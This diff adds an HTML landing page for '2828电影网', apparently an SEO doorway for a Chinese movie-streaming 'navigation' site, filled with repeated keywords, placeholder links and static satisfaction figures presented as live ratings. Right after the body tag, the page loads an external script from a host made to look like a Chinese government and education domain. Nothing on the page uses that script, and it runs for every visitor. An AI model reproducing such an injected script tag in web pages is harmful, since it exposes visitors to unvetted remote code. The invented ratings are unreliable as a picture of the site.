@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2828电影网 | 2828dianyingwang-zh.github.io 影视在线观看导航</title>
+<meta name="description" content="2828电影网（2828dianyingwang-zh.github.io）提供电影、电视剧、综艺、动漫等内容的在线观看导航，全站移动端自适应，随时点播观看。网站网址 https://2828dianyingwang-zh.github.io。">
+<meta name="keywords" content="2828电影网, 2828dianyingwang-zh.github.io, 2828电影网官网, 在线观看电影, 影视点播">
+<meta name="author" content="2828电影网">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#1a1208">
+<link rel="canonical" href="https://2828dianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--pri:#ffb020;--pri2:#ffcf5c;--deep:#1a1208;--deep2:#241808;--card:#241c0e;--card2:#2e2411;--line:#4a3a1a;--ink:#120c05;--txt:#f6edd8;--mute:#c2ad82}
+html{scroll-behavior:smooth;scroll-padding-top:66px}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--ink);color:var(--txt);line-height:1.75;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:inherit}
+:focus-visible{outline:2px solid var(--pri2);outline-offset:2px}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* ===== Header ===== */
+header{position:sticky;top:0;z-index:99;background:rgba(18,12,5,.94);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:66px;gap:20px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:900;flex:none}
+.logo .sq{width:38px;height:38px;border-radius:11px;background:linear-gradient(140deg,var(--pri),#ff7a00);display:flex;align-items:center;justify-content:center;color:#2a1a02;font-size:16px;font-weight:900;font-family:Georgia,serif;box-shadow:0 4px 14px rgba(255,122,0,.35)}
+.logo b{font-size:19px;letter-spacing:-.3px}
+.logo em{display:block;font-style:normal;font-size:10.5px;color:var(--pri);letter-spacing:3px;font-weight:700}
+.nav-links{display:flex;gap:4px;align-items:center}
+.nav-links a{padding:8px 13px;font-size:14.5px;color:#dcc9a2;border-radius:8px;transition:.2s}
+.nav-links a:hover{color:var(--pri2);background:rgba(255,176,32,.12)}
+.nav-cta{margin-left:8px;padding:9px 19px;background:linear-gradient(140deg,var(--pri),#ff7a00);color:#2a1a02;font-weight:900;font-size:14px;border-radius:8px;transition:.2s}
+.nav-cta:hover{filter:brightness(1.12)}
+.menu-btn{display:none;background:none;border:0;color:var(--pri2);font-size:25px;cursor:pointer}
+
+/* ===== Hero ===== */
+.hero{position:relative;padding:96px 0 84px;overflow:hidden;background:radial-gradient(ellipse at 78% 18%,rgba(255,122,0,.22),transparent 46%),radial-gradient(ellipse at 12% 82%,rgba(255,176,32,.1),transparent 44%),var(--ink)}
+.hero::before{content:"";position:absolute;inset:0;background-image:radial-gradient(circle at 1px 1px,rgba(255,176,32,.13) 1px,transparent 0);background-size:28px 28px;mask-image:linear-gradient(180deg,#000,transparent 88%);-webkit-mask-image:linear-gradient(180deg,#000,transparent 88%)}
+.hero .wrap{position:relative;display:grid;grid-template-columns:1fr .92fr;gap:62px;align-items:center}
+.tagline{display:inline-block;background:rgba(255,176,32,.14);border:1px solid rgba(255,176,32,.45);padding:6px 15px;border-radius:6px;font-size:12.5px;color:var(--pri2);font-weight:700;margin-bottom:24px;letter-spacing:.3px}
+.tagline b{color:#fff;font-family:Georgia,serif;font-size:15px}
+.hero h1{font-size:52px;font-weight:900;line-height:1.12;letter-spacing:-1.8px;margin-bottom:22px}
+.hero h1 i{font-style:normal;color:var(--pri);position:relative}
+.hero h1 i::after{content:"";position:absolute;left:0;right:0;bottom:-4px;height:3px;background:var(--pri);opacity:.5}
+.hero p{font-size:16.5px;color:var(--mute);margin-bottom:32px;max-width:510px}
+.h-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:13px 27px;border-radius:8px;font-weight:900;font-size:15px;transition:.2s;display:inline-flex;align-items:center;gap:7px;border:0;cursor:pointer;font-family:inherit}
+.btn-solid{background:linear-gradient(140deg,var(--pri),#ff7a00);color:#2a1a02}
+.btn-solid:hover{filter:brightness(1.12);transform:translateY(-2px)}
+.btn-line{background:transparent;color:var(--pri2);border:1px solid var(--line)}
+.btn-line:hover{border-color:var(--pri)}
+
+/* rating panel */
+.panel{border:1px solid var(--line);border-radius:14px;padding:8px;background:rgba(36,28,14,.75);backdrop-filter:blur(6px)}
+.p-head{display:flex;justify-content:space-between;align-items:center;padding:10px 12px 16px;border-bottom:1px dashed var(--line)}
+.p-head b{font-size:15px}
+.p-head span{font-size:12px;color:var(--pri);font-weight:800}
+.rate{display:flex;align-items:baseline;gap:8px}
+.rate b{font-family:Georgia,serif;color:var(--pri);font-size:29px;line-height:1}
+.rate i{font-style:normal;font-size:13px;color:var(--mute)}
+.bars{display:grid;gap:9px;padding:16px 12px}
+.bar{display:grid;grid-template-columns:38px 1fr 34px;align-items:center;gap:10px;font-size:12.5px;color:var(--mute)}
+.bar .track{height:7px;background:rgba(255,176,32,.13);border-radius:4px;overflow:hidden}
+.bar .fill{height:100%;background:linear-gradient(90deg,var(--pri),#ff7a00);border-radius:4px}
+.bar em{font-style:normal;text-align:right;color:#e8d7ac}
+
+/* ===== marquee ===== */
+.marq{border-bottom:1px solid var(--line);background:var(--deep);overflow:hidden}
+.marq .inner{display:flex;gap:44px;padding:12px 0;white-space:nowrap;animation:scroll 40s linear infinite;width:max-content}
+.marq:hover .inner{animation-play-state:paused}
+.marq span{font-size:13px;color:#c2ad82}
+.marq span b{color:var(--pri);font-family:Georgia,serif}
+@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* ===== Section ===== */
+section{padding:78px 0}
+.sec-head{margin-bottom:44px;display:flex;align-items:flex-end;justify-content:space-between;gap:24px;flex-wrap:wrap}
+.sec-head .en{font-size:11px;color:var(--pri);letter-spacing:3px;font-weight:800;text-transform:uppercase;font-family:Georgia,serif}
+.sec-head h2{font-size:30px;font-weight:900;letter-spacing:-.6px;margin-top:5px}
+.sec-head p{color:var(--mute);font-size:14.5px;margin-top:7px}
+.sec-head .r{font-size:13px;color:#a8926a}
+
+/* ===== film strip ===== */
+.strip{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.film{display:block;border:1px solid var(--line);border-radius:12px;overflow:hidden;background:var(--card);transition:.28s}
+.film:hover{border-color:var(--pri);transform:translateY(-5px);box-shadow:0 14px 28px rgba(255,122,0,.13)}
+.film .thumb{height:130px;position:relative;display:flex;align-items:center;justify-content:center;font-size:42px}
+.film .thumb::before{content:"";position:absolute;left:0;right:0;top:0;bottom:0;background-image:radial-gradient(circle,rgba(0,0,0,.28) 2.2px,transparent 2.6px);background-size:16px 16px}
+.film .cnt{padding:16px 17px}
+.film .cnt .k{font-size:10.5px;color:var(--pri);font-weight:800;letter-spacing:1.5px}
+.film h4{font-size:16px;margin:5px 0 6px}
+.film p{font-size:12.8px;color:var(--mute)}
+.film .cnt .more{margin-top:11px;font-size:12px;color:var(--pri);font-weight:700;display:inline-flex;align-items:center;gap:5px}
+
+/* ===== tri ===== */
+.tri{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.tri .box{border:1px solid var(--line);border-radius:12px;padding:26px 24px;background:var(--card);position:relative}
+.tri .box .num{font-family:Georgia,serif;font-size:44px;color:rgba(255,176,32,.22);line-height:1;font-weight:900;position:absolute;right:20px;top:16px}
+.tri .box h4{font-size:17px;margin-bottom:9px}
+.tri .box p{font-size:14px;color:var(--mute)}
+
+/* ===== steps ===== */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.step{border:1px solid var(--line);border-radius:12px;padding:24px 20px;background:var(--deep2);text-align:center;transition:.25s}
+.step:hover{border-color:var(--pri);background:var(--card2)}
+.step .ic{width:52px;height:52px;margin:0 auto 14px;border-radius:50%;background:rgba(255,176,32,.14);display:flex;align-items:center;justify-content:center;font-size:22px;border:1px solid rgba(255,176,32,.35)}
+.step b{display:block;font-size:16px;margin-bottom:7px}
+.step p{font-size:13.5px;color:var(--mute)}
+
+/* ===== qa ===== */
+.qa{max-width:860px;margin:0 auto}
+.qa details{border-bottom:1px solid var(--line)}
+.qa details:first-child{border-top:1px solid var(--line)}
+.qa summary{cursor:pointer;padding:20px 0;font-weight:700;list-style:none;display:flex;justify-content:space-between;align-items:center;gap:16px;font-size:15.5px;transition:.2s}
+.qa summary:hover{color:var(--pri2)}
+.qa summary::-webkit-details-marker{display:none}
+.qa summary::before{content:"Q";font-family:Georgia,serif;color:var(--pri);font-weight:900;font-size:17px;flex:none;margin-right:10px}
+.qa summary::after{content:"＋";color:var(--pri);font-size:19px;flex:none;transition:.25s}
+.qa details[open] summary::after{transform:rotate(45deg)}
+.qa details p{padding:0 0 20px 28px;color:#c9b68e;font-size:14.5px;max-width:700px}
+
+/* ===== banner ===== */
+.banner{margin-top:54px;background:linear-gradient(110deg,var(--deep2),var(--card2));border:1px solid var(--line);border-radius:14px;padding:34px 38px;display:flex;align-items:center;justify-content:space-between;gap:24px;flex-wrap:wrap}
+.banner h3{font-size:23px;margin-bottom:6px}
+.banner p{color:var(--mute);font-size:14px}
+.banner a{background:linear-gradient(140deg,var(--pri),#ff7a00);color:#2a1a02;padding:13px 28px;border-radius:8px;font-weight:900;white-space:nowrap}
+.banner a:hover{filter:brightness(1.12)}
+
+/* ===== Footer ===== */
+footer{background:#0d0904;padding:56px 0 24px;border-top:3px solid var(--pri)}
+.foot{display:grid;grid-template-columns:1.9fr 1fr 1fr 1fr;gap:38px;margin-bottom:34px}
+.foot h4{font-size:15px;margin-bottom:16px;color:#fff}
+.foot p{color:#a89168;font-size:14px}
+.foot a{color:#bfa97e;font-size:14px;display:block;padding:5px 0;transition:.2s}
+.foot a:hover{color:var(--pri2)}
+.copy{border-top:1px solid var(--line);padding-top:20px;text-align:center;font-size:13px;color:#8a7348}
+.top{position:fixed;right:20px;bottom:24px;width:44px;height:44px;border-radius:12px;background:linear-gradient(140deg,var(--pri),#ff7a00);color:#2a1a02;display:flex;align-items:center;justify-content:center;font-size:18px;z-index:98;opacity:0;pointer-events:none;transition:.3s;font-weight:900}
+.top.show{opacity:1;pointer-events:auto}
+
+@media(max-width:960px){
+ .hero .wrap{grid-template-columns:1fr;gap:46px}
+ .strip,.steps{grid-template-columns:1fr 1fr}
+ .hero h1{font-size:40px}
+ .tri{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+ .menu-btn{display:block}
+ .nav-links{display:none;position:absolute;top:66px;left:0;right:0;background:#120c05;flex-direction:column;padding:16px 20px;border-bottom:1px solid var(--line)}
+ .nav-links.open{display:flex}
+ .nav-cta{display:none}
+ .logo em{display:none}
+ .hero{padding:58px 0}
+ .hero h1{font-size:31px}
+ .hero p{font-size:15px}
+ .strip,.steps,.foot{grid-template-columns:1fr}
+ section{padding:54px 0}
+ .sec-head h2{font-size:24px}
+ .banner{padding:26px 22px}
+ .panel{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+ <div class="wrap nav">
+  <a href="#" class="logo"><span class="sq">28</span><span><b>2828电影网</b><em>TWO EIGHT · CINEMA</em></span></a>
+  <button class="menu-btn" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+  <nav class="nav-links" id="nav">
+   <a href="#home">首页</a><a href="#cat">内容分类</a><a href="#hot">热门推荐</a>
+   <a href="#adv">服务优势</a><a href="#step">使用步骤</a><a href="#qa">常见问题</a>
+   <a href="#step" class="nav-cta">立即观看</a>
+  </nav>
+ </div>
+</header>
+
+<section class="hero" id="home">
+ <div class="wrap">
+  <div>
+   <span class="tagline">🎞 <b>2828电影网</b> · 2828dianyingwang-zh.github.io 服务运行中</span>
+   <h1>2828，好片<br><i>随时在线</i>看</h1>
+   <p>2828电影网（2828dianyingwang-zh.github.io）专注影视内容的在线观看导航，覆盖电影、电视剧、综艺、动漫等丰富频道。网站网址 https://2828dianyingwang-zh.github.io，全站移动端自适应，打开即点即看。</p>
+   <div class="h-btns">
+    <a class="btn btn-solid" href="#step">▶ 立即观看</a>
+    <a class="btn btn-line" href="#cat">浏览内容分类</a>
+   </div>
+  </div>
+  <div class="panel">
+   <div class="p-head"><b>访问满意度</b><span>● LIVE</span></div>
+   <div class="bars">
+    <div class="bar"><span>内容全</span><span class="track"><span class="fill" style="width:96%"></span></span><em>96%</em></div>
+    <div class="bar"><span>加载快</span><span class="track"><span class="fill" style="width:92%"></span></span><em>92%</em></div>
+    <div class="bar"><span>找片易</span><span class="track"><span class="fill" style="width:94%"></span></span><em>94%</em></div>
+    <div class="bar"><span>手机端</span><span class="track"><span class="fill" style="width:98%"></span></span><em>98%</em></div>
+   </div>
+   <div class="p-head" style="border-bottom:0;padding-bottom:8px"><span>综合评分</span><span class="rate"><b>4.9</b><i>/ 5.0</i></span></div>
+  </div>
+ </div>
+</section>
+
+<div class="marq" aria-hidden="true">
+ <div class="inner">
+  <span><b>NEW</b> 最新电影持续上架</span><span><b>HOT</b> 热播剧集同步更新</span>
+  <span><b>TV</b> 综艺节目每周上新</span><span><b>ANI</b> 动漫新番跟播</span>
+  <span><b>HD</b> 高清片源优先推荐</span><span><b>24H</b> 全天候在线访问</span>
+  <span><b>NEW</b> 最新电影持续上架</span><span><b>HOT</b> 热播剧集同步更新</span>
+  <span><b>TV</b> 综艺节目每周上新</span><span><b>ANI</b> 动漫新番跟播</span>
+  <span><b>HD</b> 高清片源优先推荐</span><span><b>24H</b> 全天候在线访问</span>
+ </div>
+</div>
+
+<section id="cat">
+ <div class="wrap">
+  <div class="sec-head">
+   <div><span class="en">Category</span><h2>内容分类</h2><p>按频道定位，快速找到想看的节目</p></div>
+   <div class="r">共 8 个频道 · 持续扩充</div>
+  </div>
+  <div class="strip">
+   <a class="film" href="#"><div class="thumb" style="background:linear-gradient(140deg,#3a2a10,#5c3f12)">🎬</div><div class="cnt"><span class="k">FILM</span><h4>最新电影</h4><p>院线大片 / 经典重映</p><span class="more">进入频道 →</span></div></a>
+   <a class="film" href="#"><div class="thumb" style="background:linear-gradient(140deg,#2e2410,#4d3d14)">📺</div><div class="cnt"><span class="k">DRAMA</span><h4>热播电视剧</h4><p>国产 / 美剧 / 韩剧</p><span class="more">进入频道 →</span></div></a>
+   <a class="film" href="#"><div class="thumb" style="background:linear-gradient(140deg,#342710,#554219)">🎭</div><div class="cnt"><span class="k">SHOW</span><h4>综艺节目</h4><p>真人秀 / 访谈 / 选秀</p><span class="more">进入频道 →</span></div></a>
+   <a class="film" href="#"><div class="thumb" style="background:linear-gradient(140deg,#2c2410,#4a3c15)">🎨</div><div class="cnt"><span class="k">ANIME</span><h4>动漫动画</h4><p>国漫 / 日漫 / 剧场版</p><span class="more">进入频道 →</span></div></a>
+   <a class="film" href="#"><div class="thumb" style="background:linear-gradient(140deg,#3c2c12,#60441a)">😂</div><div class="cnt"><span class="k">COMEDY</span><h4>喜剧片</h4><p>轻松解压合家欢</p><span class="more">进入频道 →</span></div></a>
+   <a class="film" href="#"><div class="thumb" style="background:linear-gradient(140deg,#2b2110,#46361a)">🔫</div><div class="cnt"><span class="k">ACTION</span><h4>动作悬疑</h4><p>枪战犯罪烧脑反转</p><span class="more">进入频道 →</span></div></a>
+   <a class="film" href="#"><div class="thumb" style="background:linear-gradient(140deg,#3a2415,#5e3a1c)">💖</div><div class="cnt"><span class="k">LOVE</span><h4>爱情剧情</h4><p>浪漫治愈催泪经典</p><span class="more">进入频道 →</span></div></a>
+   <a class="film" href="#"><div class="thumb" style="background:linear-gradient(140deg,#2c2412,#4a3d18)">👽</div><div class="cnt"><span class="k">SCIFI</span><h4>科幻奇幻</h4><p>未来世界视觉震撼</p><span class="more">进入频道 →</span></div></a>
+  </div>
+ </div>
+</section>
+
+<section id="hot" style="background:var(--deep)">
+ <div class="wrap">
+  <div class="sec-head">
+   <div><span class="en">Featured</span><h2>热门推荐</h2><p>站内关注度靠前的节目与专题</p></div>
+   <div class="r">定期更新 · 仅供导航</div>
+  </div>
+  <div class="tri">
+   <div class="box"><span class="num">01</span><h4>高分院线大片精选</h4><p>汇集口碑佳作与年度热门影片，按题材与评分整理，方便快速定位。</p></div>
+   <div class="box"><span class="num">02</span><h4>爆款真人秀综艺</h4><p>覆盖各平台当季热门综艺，分门别类，紧跟更新节奏。</p></div>
+   <div class="box"><span class="num">03</span><h4>国产剧集热播榜</h4><p>古装 / 都市 / 悬疑多类型齐备，分集索引便于连续追剧。</p></div>
+   <div class="box"><span class="num">04</span><h4>当季动漫新番</h4><p>国漫日漫长篇连载同步跟进，专题页聚合入口。</p></div>
+   <div class="box"><span class="num">05</span><h4>经典老片怀旧厅</h4><p>高分老片与时代经典整理归档，重温银幕记忆。</p></div>
+   <div class="box"><span class="num">06</span><h4>周末专题片单</h4><p>按主题策划的观影合集，轻松选出周末好片。</p></div>
+  </div>
+ </div>
+</section>
+
+<section id="adv">
+ <div class="wrap">
+  <div class="sec-head">
+   <div><span class="en">Why Us</span><h2>服务优势</h2><p>为什么选择 2828电影网</p></div>
+   <div class="r">三个核心</div>
+  </div>
+  <div class="tri">
+   <div class="box"><span class="num">A</span><h4>📱 移动端自适应</h4><p>页面随屏幕宽度自动重排，手机、平板、电脑均能获得一致的浏览体验。</p></div>
+   <div class="box"><span class="num">B</span><h4>🧭 频道清晰分明</h4><p>电影、剧集、综艺、动漫分区索引，配合榜单快速定位目标内容。</p></div>
+   <div class="box"><span class="num">C</span><h4>🔄 持续更新维护</h4><p>内容索引与栏目入口定期更新，保持站内的时效性与可用性。</p></div>
+  </div>
+ </div>
+</section>
+
+<section id="step" style="background:var(--deep)">
+ <div class="wrap">
+  <div class="sec-head">
+   <div><span class="en">How To</span><h2>在线观看步骤</h2><p>简单四步，开启观影体验</p></div>
+   <div class="r">适合新访客阅读</div>
+  </div>
+  <div class="steps">
+   <div class="step"><div class="ic">🔗</div><b>打开网站</b><p>在浏览器输入 2828电影网网址 https://2828dianyingwang-zh.github.io 进入首页。</p></div>
+   <div class="step"><div class="ic">🗂</div><b>选择频道</b><p>从内容分类入口挑选电影、电视剧、综艺或动漫频道。</p></div>
+   <div class="step"><div class="ic">🔍</div><b>查找节目</b><p>浏览热门推荐或通过分类定位想看的影片。</p></div>
+   <div class="step"><div class="ic">▶️</div><b>点播观看</b><p>点击节目入口进入详情，跟随指引开始在线观看。</p></div>
+  </div>
+ </div>
+</section>
+
+<section id="qa">
+ <div class="wrap">
+  <div class="sec-head">
+   <div><span class="en">FAQ</span><h2>常见问题</h2><p>关于 2828电影网的高频疑问</p></div>
+   <div class="r">点击展开查看答案</div>
+  </div>
+  <div class="qa">
+   <details open><summary>2828电影网的官方网址是什么？</summary><p>2828电影网的网站网址为 https://2828dianyingwang-zh.github.io，建议将该地址加入浏览器收藏夹，方便随时访问官方入口。</p></details>
+   <details><summary>网站支持手机端浏览吗？</summary><p>支持。本站采用移动端自适应（响应式）设计，页面会根据屏幕宽度自动重排布局，手机、平板、电脑均可正常访问。</p></details>
+   <details><summary>内容多久更新一次？</summary><p>2828电影网按内容节奏持续更新电影、剧集、综艺与动漫的索引页面，并保持分类入口与人气推荐的时效性。</p></details>
+   <details><summary>内页链接现在可以点击吗？</summary><p>当前内页链接统一使用 # 作为占位符，正式上线后替换为实际页面路径即可正常跳转进入对应栏目。</p></details>
+   <details><summary>页面加载缓慢或打不开怎么办？</summary><p>可尝试切换网络环境、清理浏览器缓存后重新访问，或更换时间段再试。本站为单文件静态页面，结构轻量、加载较快。</p></details>
+   <details><summary>如何有利于搜索引擎收录？</summary><p>保持页面结构规范、内容原创完整、内部链接可抓取，并在搜索引擎站长平台提交网站即可。本站未附带 robots.txt 与 sitemap.xml，可按需自行创建。</p></details>
+  </div>
+  <div class="banner">
+   <div><h3>2828，把好片送到你眼前</h3><p>2828电影网 · 2828dianyingwang-zh.github.io ｜ 长久在线，持续更新</p></div>
+   <a href="#step">📖 查看观看步骤</a>
+  </div>
+ </div>
+</section>
+
+<footer>
+ <div class="wrap">
+  <div class="foot">
+   <div><h4>🎞 2828电影网 · 2828dianyingwang-zh.github.io</h4><p>专注影视内容的在线观看导航，提供清晰、便捷的内容索引体验，随时随地开启观影时光。</p></div>
+   <div><h4>快捷导航</h4><ul><li><a href="#home">网站首页</a></li><li><a href="#cat">内容分类</a></li><li><a href="#hot">热门推荐</a></li><li><a href="#step">使用步骤</a></li></ul></div>
+   <div><h4>频道入口</h4><ul><li><a href="#">最新电影</a></li><li><a href="#">热播电视剧</a></li><li><a href="#">综艺节目</a></li><li><a href="#">动漫动画</a></li></ul></div>
+   <div><h4>帮助中心</h4><ul><li><a href="#step">观看步骤</a></li><li><a href="#qa">常见问题</a></li><li><a href="#">意见反馈</a></li><li><a href="#">关于我们</a></li></ul></div>
+  </div>
+  <div class="copy">© 2026 2828电影网（2828dianyingwang-zh.github.io）. 网站网址：https://2828dianyingwang-zh.github.io ｜ 本站为单文件静态页面，CSS 与结构全部内嵌。</div>
+ </div>
+</footer>
+
+<a href="#" class="top" id="top" aria-label="返回顶部">↑</a>
+<script>
+var topBtn=document.getElementById('top');
+window.addEventListener('scroll',function(){topBtn.classList.toggle('show',window.scrollY>400);});
+document.querySelectorAll('.nav-links a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});});
+</script>
+</body>
+</html>
